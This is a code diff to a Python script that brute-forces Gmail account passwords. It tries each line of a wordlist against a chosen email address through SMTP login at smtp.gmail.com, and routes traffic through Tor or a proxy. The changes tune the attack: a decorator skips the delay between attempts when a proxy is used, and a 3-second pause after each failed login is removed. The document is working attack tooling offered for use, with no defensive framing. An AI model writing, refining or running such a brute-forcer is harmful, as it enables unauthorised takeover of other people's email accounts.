@@ -6,6 +6,8 @@ import requests
 import socket
 import subprocess
 import time
+import sys
+from functools import wraps
 
 def check_tor_running():
 	try:
@@ -13,6 +15,20 @@ def check_tor_running():
 	except subprocess.CalledProcessError:
 		print("[-] Tor not running exiting.")
 		exit()
+
+
+def sleep_timer(function):
+	@wraps(function)
+	def check_for_proxy(*args):
+		try:
+			arguments = sys.argv[1:]
+		except IndexError:
+			pass
+		if "--proxy" not in arguments:
+			time.sleep(1.5)  # sleep only if proxy not in argument
+			return function(*args)
+		return function(*args)
+	return check_for_proxy
 
 
 class Colors:
@@ -42,7 +58,7 @@ class Parser:
 		self.args = argparse.ArgumentParser(description="Program to bruteforce emails on gmail")
 		self.args.add_argument("--email", help="Email you choose to bruteforce", required=True)
 		self.args.add_argument("--file", help="Wordlist to pick and try to use to bruteforce", type=self.validate_file, required=True)
-		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy")
+		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy", action='store_true')
 
 		self.args_parsed = self.args.parse_args()
 
@@ -67,6 +83,7 @@ class Email:
 		self.email_connection(self.email, self.password)
 
 
+	@sleep_timer
 	def email_connection(self, email, password):
 		gmail_server = smtplib.SMTP('smtp.gmail.com', 587)
 		gmail_server.starttls()
@@ -79,8 +96,6 @@ class Email:
 		except smtplib.SMTPAuthenticationError:
 			incorrect_password = f"[-] Incorrect password [==>] {password}"
 			print(Colors.purple_color(incorrect_password))
-			time.sleep(3)
-
 
 class Proxy:
 	def __init__(self):
@@ -105,6 +120,8 @@ class BruteForce(Parser):
 		super().__init__()
 		self.email = self.get_email()
 		self.file = self.get_file()
+		dash = "-" * 20
+		print(f"\n{str(dash)} Starting {str(dash)}\n")
 
 	def read_file(self):
 		with open(self.file, "r") as file:
